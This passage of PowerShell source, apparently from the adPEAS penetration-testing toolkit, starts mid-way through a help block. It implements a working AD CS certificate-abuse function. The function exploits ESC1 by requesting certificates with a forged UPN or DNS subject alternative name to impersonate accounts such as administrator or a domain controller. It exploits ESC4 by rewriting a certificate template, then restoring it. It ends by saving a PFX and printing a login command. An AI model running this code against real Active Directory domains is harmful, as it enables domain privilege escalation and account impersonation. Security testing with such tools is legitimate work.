    ESC1 exploitation with explicit subject and UPN SAN.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"
    ESC4 exploitation: temporarily modifies the template, requests a cert as Administrator, then restores the original template.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -Subject "dc01.contoso.com" -DNS "dc01.contoso.com"
    Requests a machine certificate with DNS SAN.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$TemplateName,

        [string]$Impersonate,

        [Alias('SubjectName')]
        [string]$Subject,

        [string]$UPN,

        [string[]]$DNS,

        [string[]]$AlternativeNames,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048,

        [string]$OutputPath,

        [PSCredential]$Credential,

        [string]$Domain,
        [string]$Server,

        [switch]$ModifyTemplate,
        [switch]$UseHTTP,
        [switch]$NoPassword,
        [switch]$PassThru,
        [switch]$Force
    )

    process {
        $FunctionPrefix = "[Request-ADCSCertificate]"

        # === Step 1: Determine CA Server ===
        # Tracks ordered list of CAs to try (for fallback)
        $candidateCAs = @()

        if ($CAServer) {
            # Explicit CA server - single candidate, no discovery needed
            $candidateCAs = @([PSCustomObject]@{
                Name            = $CAServer
                DNSHostName     = $CAServer
                CertificateTemplates = @()
                _Explicit       = $true
            })
        }
        else {
            Write-Log "$FunctionPrefix No CA server specified, attempting auto-discovery"

            # Build connection params for LDAP queries
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }

            # Check LDAP connection - we only need it for read-only CA discovery.
            # If Ensure-LDAPConnection fails (e.g. TGT mismatch) but $Script:LdapConnection
            # still exists, proceed anyway - the LDAP session itself may still work.
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                if (-not $Script:LdapConnection) {
                    Write-Warning "[!] LDAP connection required for CA auto-discovery. Use Connect-adPEAS first or specify -CAServer."
                    return $null
                }
                Write-Log "$FunctionPrefix Ensure-LDAPConnection reported issues but LDAP session exists, attempting CA discovery anyway"
            }

            # Discover all CAs from Active Directory
            # Pass explicit Domain/Server from session context so Get-CertificateAuthority's
            # internal Ensure-LDAPConnection takes the explicit-params path (no TGT re-check,
            # no duplicate error output)
            $caQueryParams = @{}
            if ($Domain) {
                $caQueryParams['Domain'] = $Domain
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $caQueryParams['Domain'] = $Script:LDAPContext['Domain']
            }
            if ($Server) {
                $caQueryParams['Server'] = $Server
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Server']) {
                $caQueryParams['Server'] = $Script:LDAPContext['Server']
            }
            $allCAs = @(Get-CertificateAuthority @caQueryParams | Where-Object { -not $_._QueryError })
            if ($allCAs.Count -eq 0) {
                Write-Warning "[!] No Certificate Authorities found in Active Directory. Specify -CAServer manually."
                return $null
            }

            # Log all discovered CAs and their templates
            Show-Line "Found $($allCAs.Count) Certificate Authority(ies) in Active Directory" -Class Note
            foreach ($ca in $allCAs) {
                $templateCount = @($ca.CertificateTemplates).Count
                Write-Verbose "$FunctionPrefix CA '$($ca.Name)' ($($ca.DNSHostName)) - $templateCount published template(s)"
                foreach ($tmpl in ($ca.CertificateTemplates | Sort-Object)) {
                    Write-Verbose "$FunctionPrefix   - $tmpl"
                }
            }

            # Filter CAs that publish the requested template
            $matchingCAs = @($allCAs | Where-Object { $_.CertificateTemplates -contains $TemplateName })

            if ($matchingCAs.Count -eq 0) {
                Write-Warning "[!] Template '$TemplateName' is not published on any CA"
                $allTemplates = @($allCAs | ForEach-Object { $_.CertificateTemplates } | Sort-Object -Unique)
                if ($allTemplates.Count -gt 0) {
                    Show-Line "Available templates across all CAs:"
                    foreach ($tmpl in $allTemplates) {
                        Show-Line "  - $tmpl"
                    }
                }
                return $null
            }

            # Filter CAs with valid DNS hostname
            $candidateCAs = @($matchingCAs | Where-Object { $_.DNSHostName })
            if ($candidateCAs.Count -eq 0) {
                Write-Warning "[!] CAs publishing '$TemplateName' have no DNS hostname. Specify -CAServer manually."
                return $null
            }

            if ($candidateCAs.Count -gt 1) {
                Show-Line "$($candidateCAs.Count) CAs publish template '$TemplateName' - will try in order with automatic fallback:" -Class Note
                foreach ($ca in $candidateCAs) {
                    Show-Line "  - $($ca.Name) ($($ca.DNSHostName))"
                }
            }
            else {
                Show-Line "Auto-discovered CA: $($candidateCAs[0].Name) ($($candidateCAs[0].DNSHostName))" -Class Note
            }
        }

        # === Step 1b: Try candidate CAs in order (HTTPS first, HTTP fallback) ===
        $CAServer = $null
        $resolvedUseHTTP = $UseHTTP.IsPresent
        $lastError = $null

        # Build protocol list: -UseHTTP means only HTTP, otherwise try HTTPS then HTTP
        $protocolsToTry = if ($UseHTTP) { @('http') } else { @('https', 'http') }

        foreach ($candidateCA in $candidateCAs) {
            $testHost = $candidateCA.DNSHostName
            $caReached = $false

            foreach ($protocol in $protocolsToTry) {
                $testUrl = "${protocol}://${testHost}/certsrv/"
                Write-Log "$FunctionPrefix Testing CA endpoint: $testUrl"

                try {
                    $testRequest = [System.Net.HttpWebRequest]::Create($testUrl)
                    $testRequest.Method = 'HEAD'
                    $testRequest.Timeout = 5000
                    $testRequest.AllowAutoRedirect = $true

                    # Temporarily ignore SSL errors for reachability check
                    $origCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

                    if ($Credential) {
                        $testRequest.Credentials = $Credential.GetNetworkCredential()
                    }
                    else {
                        $testRequest.UseDefaultCredentials = $true
                    }

                    $testResponse = $null
                    try {
                        $testResponse = $testRequest.GetResponse()
                        $statusCode = [int]$testResponse.StatusCode
                    }
                    catch [System.Net.WebException] {
                        $webEx = $_.Exception
                        if ($webEx.Response) {
                            $statusCode = [int]$webEx.Response.StatusCode
                            try { $webEx.Response.Close() } catch { }
                            try { $webEx.Response.Dispose() } catch { }
                        }
                        else {
                            throw
                        }
                    }
                    finally {
                        if ($testResponse) {
                            try { $testResponse.Close() } catch { }
                            try { $testResponse.Dispose() } catch { }
                        }
                        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $origCallback
                    }

                    # 200, 401, 403 all mean the endpoint exists and is reachable
                    if ($statusCode -in @(200, 301, 302, 401, 403)) {
                        $CAServer = $testHost
                        $resolvedUseHTTP = ($protocol -eq 'http')
                        Write-Log "$FunctionPrefix CA endpoint reachable: $testUrl (HTTP $statusCode)"
                        if ($protocol -eq 'http' -and -not $UseHTTP) {
                            Show-Line "HTTPS not available on '$testHost', falling back to HTTP" -Class Hint
                        }
                        $caReached = $true
                        break
                    }
                    else {
                        $lastError = "HTTP $statusCode"
                        Write-Log "$FunctionPrefix CA endpoint returned unexpected status: $testUrl - HTTP $statusCode"
                    }
                }
                catch {
                    $lastError = $_.Exception.Message
                    Write-Log "$FunctionPrefix CA endpoint unreachable: $testUrl - $lastError"
                }
            }

            if ($caReached) { break }

            # Neither HTTPS nor HTTP worked for this CA
            if ($candidateCAs.Count -gt 1 -or -not $candidateCA._Explicit) {
                Show-Line "CA '$($candidateCA.Name)' ($testHost) unreachable via /certsrv/ - trying next CA" -Class Note
            }
        }

        if (-not $CAServer) {
            if ($candidateCAs.Count -eq 1 -and $candidateCAs[0]._Explicit) {
                Write-Warning "[!] Cannot reach CA server '$($candidateCAs[0].DNSHostName)': $lastError"
            }
            else {
                Write-Warning "[!] None of the $($candidateCAs.Count) candidate CAs are reachable via /certsrv/. Last error: $lastError"
            }
            return $null
        }

        Show-Line "Requesting certificate from CA '$CAServer' using template '$TemplateName'" -Class Note

        # === Step 1c: ModifyTemplate - Backup and modify template (ESC4) ===
        $templateBackupPath = $null
        $templateModified = $false

        if ($ModifyTemplate) {
            # Build connection params for Set-CertificateTemplate
            $templateParams = @{}
            if ($Domain) { $templateParams['Domain'] = $Domain }
            if ($Server) { $templateParams['Server'] = $Server }

            # Ensure LDAP connection for template operations
            if (-not (Ensure-LDAPConnection @templateParams)) {
                Write-Warning "[!] LDAP connection required for -ModifyTemplate. Use Connect-adPEAS first."
                return $null
            }

            # Backup template before modification
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $templateBackupPath = "${TemplateName}_backup_${timestamp}.json"

            Show-Line "Backing up template '$TemplateName' before modification" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName -Export $templateBackupPath @templateParams
            }
            catch {
                Write-Warning "[!] Failed to backup template: $_"
                return $null
            }

            if (-not (Test-Path -Path $templateBackupPath)) {
                Write-Warning "[!] Template backup file was not created. Aborting to prevent data loss."
                return $null
            }

            Show-Line "Template backup saved to: $templateBackupPath" -Class Hint

            # Modify template for ESC1 exploitation
            Show-Line "Modifying template '$TemplateName' for certificate request" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName `
                    -AllowEnrolleeSuppliesSubject `
                    -AddClientAuthentication `
                    -AllowExportableKey `
                    -RemoveManagerApproval `
                    @templateParams -Confirm:$false

                $templateModified = $true
                Show-Line "Template modified successfully (ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU, Exportable Key, No Manager Approval)" -Class Hint
            }
            catch {
                # Permission pre-check failure: no changes were made, skip restore
                if ("$_" -match "Insufficient permissions to modify template") {
                    return $null
                }

                # Other errors: changes may have been partially applied, attempt restore
                Write-Warning "[!] Failed to modify template: $_"
                Show-Line "Attempting to restore original template from backup" -Class Note
                try {
                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @templateParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template! Manual restore required from: $templateBackupPath"
                }
                return $null
            }
        }

        # Wrap remaining steps in try/finally to ensure template restore on any failure
        try {
            # === Step 2: Resolve Subject and SAN parameters ===
            # Priority: -Impersonate > -Subject/-UPN/-DNS > -AlternativeNames > defaults
            $resolvedSubjectDN = $null
            $resolvedSANs = @()

            # Get domain suffix from session for UPN construction
            $sessionDomain = $null
            if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $sessionDomain = $Script:LDAPContext['Domain']
            }

            if ($Impersonate) {
                # -Impersonate: derive Subject and SAN from a single value
                # Detection: UPN (has @), FQDN (has dots like srv-dc.contoso.com), or simple name
                if ($Impersonate -match '@') {
                    # Full UPN provided: "administrator@contoso.com"
                    $impersonateUPN = $Impersonate
                    $impersonateUser = ($Impersonate -split '@')[0]
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
                elseif ($Impersonate -match '^[^@]+\.[^@]+\.[^@]+$') {
                    # FQDN format: "srv-dc.contoso.com" (at least two dots, no @)
                    # Computer certificates use DNS SAN, not UPN
                    $hostPart = ($Impersonate -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    $resolvedSANs = @("DNS:$Impersonate")
                    Write-Log "$FunctionPrefix Impersonate resolved as DNS (FQDN): Subject=$resolvedSubjectDN, DNS=$Impersonate"
                }
                else {
                    # Simple username: "administrator" or short hostname: "srv-dc"
                    $impersonateUser = $Impersonate
                    if ($sessionDomain) {
                        $impersonateUPN = "$Impersonate@$sessionDomain"
                    }
                    elseif ($Domain) {
                        $impersonateUPN = "$Impersonate@$Domain"
                    }
                    else {
                        Write-Warning "[!] Cannot determine domain for UPN. Use full UPN format (user@domain.com) or connect to a domain first."
                        return $null
                    }
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
            }
            else {
                # Resolve Subject
                if ($Subject) {
                    # Auto-add CN= prefix if no RDN type present
                    if ($Subject -notmatch '^\s*(CN|O|OU|C|ST|L|DC|E)\s*=') {
                        $resolvedSubjectDN = "CN=$Subject"
                    }
                    else {
                        $resolvedSubjectDN = $Subject
                    }
                }
                elseif ($UPN) {
                    # -UPN specified without -Subject: derive CN from UPN (username part)
                    # ESC1 pattern for user impersonation:
                    #   -UPN administrator@contoso.com  ->  Subject: CN=administrator
                    $upnUser = ($UPN -split '@')[0]
                    $resolvedSubjectDN = "CN=$upnUser"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -UPN: $resolvedSubjectDN"
                }
                elseif ($DNS) {
                    # -DNS specified without -Subject: derive CN from first DNS name (hostname part)
                    # ESC1 pattern for computer account impersonation:
                    #   -DNS srv-dc.contoso.com  ->  Subject: CN=srv-dc
                    $firstDNS = $DNS[0]
                    $hostPart = ($firstDNS -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -DNS: $resolvedSubjectDN"
                }
                else {
                    # Default: current user from session
                    $currentUser = $null
                    if ($Script:LDAPContext -and $Script:LDAPContext['Username']) {
                        $currentUser = $Script:LDAPContext['Username']
                        if ($currentUser -match '\\(.+)$') {
                            $currentUser = $Matches[1]
                        }
                    }
                    if (-not $currentUser) {
                        $currentUser = [Environment]::UserName
                    }
                    $resolvedSubjectDN = "CN=$currentUser"
                }

                # Resolve SANs: -UPN, -DNS, and -AlternativeNames are additive
                if ($UPN) {
                    # Auto-append domain if UPN has no @ suffix
                    $resolvedUPN = $UPN
                    if ($resolvedUPN -notmatch '@') {
                        $upnDomain = if ($sessionDomain) { $sessionDomain } elseif ($Domain) { $Domain } else { $null }
                        if ($upnDomain) {
                            $resolvedUPN = "$UPN@$upnDomain"
                            Write-Log "$FunctionPrefix Auto-appended domain to UPN: $resolvedUPN"
                        }
                        else {
                            Write-Warning "[!] UPN '$UPN' has no domain suffix and no domain context available. Use full UPN format (user@domain.com)."
                            return $null
                        }
                    }
                    $resolvedSANs += "UPN:$resolvedUPN"
                }
                if ($DNS) {
                    foreach ($dnsName in $DNS) {
                        $resolvedSANs += "DNS:$dnsName"
                    }
                }
                if ($AlternativeNames) {
                    $resolvedSANs += $AlternativeNames
                }
            }

            Write-Log "$FunctionPrefix Subject: $resolvedSubjectDN"
            if ($resolvedSANs.Count -gt 0) {
                Write-Log "$FunctionPrefix SANs: $($resolvedSANs -join ', ')"
            }

            # === Step 3: Generate CSR ===
            $csrResult = $null
            try {
                $csrParams = @{
                    SubjectDN = $resolvedSubjectDN
                    KeyLength = $KeyLength
                }
                if ($resolvedSANs.Count -gt 0) {
                    $csrParams['AlternativeNames'] = $resolvedSANs
                }
                $csrResult = New-PKCS10Request @csrParams
            }
            catch {
                Write-Warning "[!] Failed to generate CSR: $_"
                return $null
            }

            Show-Line "Generated $KeyLength-bit RSA key pair and PKCS#10 CSR" -Class Note

            $rsa = $csrResult.RSAKey
            try {
                # === Step 4: Submit CSR to CA (HTTPS/HTTP first, COM fallback) ===
                $submitResult = Submit-CertsrvRequest -CAServer $CAServer `
                    -CSRBase64 $csrResult.CSRBase64 `
                    -TemplateName $TemplateName `
                    -Credential $Credential `
                    -UseHTTP:$resolvedUseHTTP

                # If HTTP/HTTPS failed with network/connection error, try COM/RPC fallback
                if ($submitResult.Status -eq 'Error' -and
                    ($submitResult.ErrorMessage -match 'unable to connect|connection|timeout|refused|unreachable' -or
                     $submitResult.RawResponse -match 'HTTP.*40[13]')) {

                    Show-Line "Web Enrollment unavailable, attempting COM/RPC fallback..." -Class Hint
                    Write-Log "$FunctionPrefix Web Enrollment failed: $($submitResult.ErrorMessage), trying COM/RPC"

                    # Need CA name for COM interface (format: CAServer\CAName)
                    # Extract from candidateCAs if available
                    $caName = $null
                    if ($candidateCAs -and $candidateCAs.Count -gt 0) {
                        $matchingCA = $candidateCAs | Where-Object { $_.DNSHostName -eq $CAServer } | Select-Object -First 1
                        if ($matchingCA) {
                            $caName = $matchingCA.Name
                        }
                    }

                    if (-not $caName) {
                        Write-Warning "[!] Cannot determine CA name for COM/RPC fallback. Web Enrollment error: $($submitResult.ErrorMessage)"
                        return $null
                    }

                    # Try COM/RPC submission
                    $comResult = Submit-COMRequest -CAServer $CAServer `
                        -CAName $caName `
                        -CSRBase64 $csrResult.CSRBase64 `
                        -TemplateName $TemplateName

                    if ($comResult.Success) {
                        # Convert COM result to certsrv result format for consistency
                        $submitResult = @{
                            Success      = $true
                            Status       = 'Issued'
                            RequestID    = $comResult.RequestID
                            Certificate  = $comResult.Certificate  # COM returns cert immediately
                            ErrorMessage = $null
                        }
                        Show-Line "Certificate issued via COM/RPC (Request ID: $($comResult.RequestID))" -Class Hint
                    }
                    else {
                        Write-Warning "[!] Both Web Enrollment and COM/RPC failed"
                        Write-Warning "[!] Web Enrollment: $($submitResult.ErrorMessage)"
                        Write-Warning "[!] COM/RPC: $($comResult.ErrorMessage)"
                        return $null
                    }
                }
                else {
                    # Handle other error types (Auth, Denied, etc.) - no COM fallback
                    if ($submitResult.Status -eq 'AuthError') {
                        Write-Warning "[!] $($submitResult.ErrorMessage)"
                        return $null
                    }

                    if ($submitResult.Status -eq 'Denied') {
                        Write-Warning "[!] $($submitResult.ErrorMessage)"
                        return $null
                    }

                    if ($submitResult.Status -eq 'Error') {
                        Write-Warning "[!] $($submitResult.ErrorMessage)"
                        return $null
                    }
                }

                if ($submitResult.Status -eq 'Pending') {
                    Show-Line "Certificate request is pending approval (Request ID: $($submitResult.RequestID))" -Class Hint
                    Show-Line "The CA administrator must approve this request before the certificate can be retrieved."
                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Success   = $true
                            Status    = 'Pending'
                            RequestID = $submitResult.RequestID
                            CAServer  = $CAServer
                            Message   = "Certificate pending approval. Request ID: $($submitResult.RequestID)"
                        }
                    }
                    return
                }

                if ($submitResult.Status -ne 'Issued' -or -not $submitResult.RequestID) {
                    Write-Warning "[!] Unexpected response from CA"
                    return $null
                }

                # === Step 5: Retrieve Certificate ===
                # COM returns certificate immediately, HTTP/HTTPS requires retrieval
                if ($submitResult.Certificate) {
                    # COM path - certificate already in result
                    $issuedCert = $submitResult.Certificate
                    Write-Log "$FunctionPrefix Certificate retrieved from COM result"
                }
                else {
                    # HTTP/HTTPS path - need to retrieve via certsrv
                    Show-Line "Certificate issued (Request ID: $($submitResult.RequestID))" -Class Hint

                    $issuedCert = Get-CertsrvCertificate -CAServer $CAServer `
                        -RequestID $submitResult.RequestID `
                        -Credential $Credential `
                        -UseHTTP:$resolvedUseHTTP

                    if (-not $issuedCert) {
                        Write-Warning "[!] Failed to retrieve issued certificate"
                        return $null
                    }
                }

                # === Step 6: Build PFX (private key + issued certificate) ===
                if ($NoPassword) {
                    $pfxPassword = $null
                }
                else {
                    $pfxPassword = New-SafePassword -Length 20
                }

                try {
                    # Use CopyWithPrivateKey to combine CA-issued cert with our private key
                    $certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($issuedCert, $rsa)
                    if ($pfxPassword) {
                        $securePfxPassword = ConvertTo-SecureString -String $pfxPassword -AsPlainText -Force
                        $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $securePfxPassword)
                    }
                    else {
                        $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
                    }
                    $certWithKey.Dispose()
                }
                catch {
                    Write-Log "$FunctionPrefix CopyWithPrivateKey failed: $_"
                    Write-Warning "[!] Failed to create PFX. .NET Framework 4.7.2+ is required."
                    return $null
                }

                # === Step 7: Save PFX ===
                if (-not $OutputPath) {
                    # Extract CN from the ISSUED certificate (CA may override the requested subject)
                    $cnForFile = if ($issuedCert.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
                    $pfxTimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                    $OutputPath = "${cnForFile}_${pfxTimestamp}.pfx"
                }

                $exportResult = Export-adPEASFile -Path $OutputPath -Content $pfxBytes -Type Binary -SanitizeFilename -Force:$Force
                if (-not $exportResult.Success) {
                    Write-Warning "[!] Failed to save PFX: $($exportResult.Message)"
                    return $null
                }
                $OutputPath = $exportResult.Path

                # === Step 8: Display Results ===
                Show-Line "Certificate saved as PFX:" -Class Hint
                Show-KeyValue "PFX Path:" $OutputPath
                if ($pfxPassword) {
                    Show-KeyValue "PFX Password:" $pfxPassword
                } else {
                    Show-KeyValue "PFX Password:" "(none)" -Class Note
                }
                Show-KeyValue "Thumbprint:" $issuedCert.Thumbprint
                Show-KeyValue "Subject:" $issuedCert.Subject
                Show-KeyValue "Issuer:" $issuedCert.Issuer
                Show-KeyValue "Valid Until:" $issuedCert.NotAfter.ToString("yyyy-MM-dd")
                Show-KeyValue "Template:" $TemplateName

                # Show SANs from issued certificate
                $sanExt = $issuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
                if ($sanExt) {
                    Show-KeyValue "SAN:" $sanExt.Format($false)
                }

                Show-EmptyLine

                # Show usage hints
                $domainHint = if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) { $Script:LDAPContext['Domain'] } else { '<domain>' }
                Show-Line "Usage with Connect-adPEAS:" -Class Note
                if ($pfxPassword) {
                    Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath' -CertificatePassword '$pfxPassword'"
                } else {
                    Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath'"
                }

                # Save certificate properties before disposing
                $certThumbprint = $issuedCert.Thumbprint
                $certSubject = $issuedCert.Subject
                $certIssuer = $issuedCert.Issuer
                $issuedCert.Dispose()

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Success     = $true
                        Status      = 'Issued'
                        RequestID   = $submitResult.RequestID
                        PFXPath     = $OutputPath
                        PFXPassword = if ($pfxPassword) { $pfxPassword } else { $null }
                        Thumbprint  = $certThumbprint
                        Subject     = $certSubject
                        Issuer      = $certIssuer
                        Template    = $TemplateName
                        CAServer    = $CAServer
                    }
                }
            }
            finally {
                if ($rsa) { $rsa.Dispose() }
            }
        }
        finally {
            # === Template Restore (always runs if template was modified) ===
            if ($templateModified -and $templateBackupPath) {
                Show-EmptyLine
                Show-Line "Restoring original template '$TemplateName' from backup" -Class Note
                try {
                    $restoreParams = @{}
                    if ($Domain) { $restoreParams['Domain'] = $Domain }
                    if ($Server) { $restoreParams['Server'] = $Server }

                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @restoreParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                    Show-Line "Backup file kept for audit: $templateBackupPath" -Class Note
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template '$TemplateName'!"
                    Write-Warning "[!] Manual restore required: Set-CertificateTemplate -Identity '$TemplateName' -Import '$templateBackupPath'"
                }
            }
        }
    }
}

#endregion
